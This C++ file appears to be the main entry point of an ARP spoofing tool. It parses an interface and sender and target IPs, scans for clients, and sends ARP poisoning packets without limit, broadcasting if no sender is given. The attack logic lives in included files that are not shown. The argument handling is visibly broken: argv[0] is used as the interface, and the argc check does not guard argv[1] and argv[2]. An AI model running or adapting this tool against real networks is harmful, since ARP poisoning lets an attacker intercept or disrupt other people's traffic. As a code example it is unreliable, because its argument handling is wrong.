#include <iostream>
#include "network/NetTools.cpp"
#include "network/ARPAttackAgent.cpp"


int main(int argc, char* argv[]) {
    if (argc < 1) {
        std::cout << "WARNING: Failed load network protocol..." << std::endl;
        return 1;
    }

    char* netInterface = argv[0];
    auto senderIP = NetTools::strToIP(argv[1]);
    auto targetIp = NetTools::strToIP(argv[2]);

    if (!targetIp) {
        std::cout << "INFO: Target-ip setting-up as my-ip...." << std::endl;
        targetIp = NetTools::findMyIP();
    }
    if (!senderIP) std::cout << "WARNING: Broadcast ARP spoofing attack...." << std::endl;

    auto arpAttackAgent = ARPAttackAgent(netInterface, targetIp.value(), senderIP);
    arpAttackAgent.scanClients();
    arpAttackAgent.sendARPAttack(ARPAttackAgent::UNLIMITED);
}
